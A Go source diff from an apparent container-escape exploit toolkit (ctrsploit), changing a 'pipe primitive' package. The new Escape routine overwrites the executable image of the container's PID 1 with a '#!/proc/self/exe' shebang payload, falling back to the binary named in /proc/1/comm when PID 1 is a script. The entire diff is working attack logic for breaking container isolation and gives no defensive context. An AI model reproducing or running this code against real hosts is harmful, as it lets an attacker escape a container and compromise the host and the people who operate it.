@@ -1,26 +1,47 @@
 package pipe_primitive
 
 import (
-	"errors"
 	"github.com/ctrsploit/ctrsploit/helper/crash"
 	"github.com/ctrsploit/ctrsploit/util"
 	"github.com/ssst0n3/awesome_libs/awesome_error"
-	"os"
+	"io/ioutil"
 )
 
 func Escape(primitive Primitive) (err error) {
+	err = WriteImageEntrypointAsSelf(primitive)
+	if err != nil {
+		return
+	}
 	return
 }
 
-func WriteImageEntrypoint(primitive Primitive, payload []byte) error {
-	path, err := util.GetProcessPathByPid(1)
+func WriteImageEntrypointAsSelf(primitive Primitive) error {
+	return WriteImageEntrypoint(primitive, []byte("#!/proc/self/exe"))
+}
+
+func WriteImageEntrypoint(primitive Primitive, payload []byte) (err error) {
+	//path, err := util.GetProcessPathByPid(1)
+	//if err != nil {
+	//	if errors.Is(err, os.ErrPermission) || errors.Is(err, os.ErrNotExist) {
+	//		awesome_error.CheckErr(err)
+	//	}
+	//	return nil
+	//}
+	path := "/proc/1/exe"
+	shebang, err := util.IsSheBang(1)
 	if err != nil {
-		if errors.Is(err, os.ErrPermission) || errors.Is(err, os.ErrNotExist) {
-			awesome_error.CheckErr(err)
-		}
-		return nil
+		awesome_error.CheckErr(err)
+		return
 	}
-	return WriteImage(primitive, path, payload)
+	if shebang {
+		comm, err := ioutil.ReadFile("/proc/1/comm")
+		if err != nil {
+			awesome_error.CheckErr(err)
+			return err
+		}
+		path = string(comm)
+	}
+	return WriteImage(primitive, string(path), payload)
 }
 
 func makeCrash() (err error) {
